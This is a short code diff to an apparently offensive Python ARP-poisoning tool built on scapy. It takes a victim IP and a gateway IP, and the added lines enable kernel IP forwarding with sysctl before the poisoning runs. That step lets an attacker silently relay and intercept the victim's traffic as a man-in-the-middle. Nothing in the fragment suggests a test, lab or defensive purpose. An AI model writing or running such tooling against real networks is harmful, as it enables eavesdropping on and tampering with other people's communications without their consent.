@@ -4,6 +4,8 @@ import scapy.all as scapy
 import argparse
 import sys
 import time
+def command_get():
+    subprocess.call(["sysctl" , "-w" , "net.ipv4.ip_forward=1" ])
 def arguments():
     parser=argparse.ArgumentParser()
     parser.add_argument("--target",dest="victim",help="Victim's IP to posion")
@@ -14,6 +16,7 @@ def arguments():
     elif not options.gateway:
         parser.error("Please specify the gateway's ip")
     elif options.victim and options.gateway:
+        command_get()
         print(colored("""
   ######                                               #                  
  #     #  ####  #  ####   ####  #    #               # #   #####  #####  
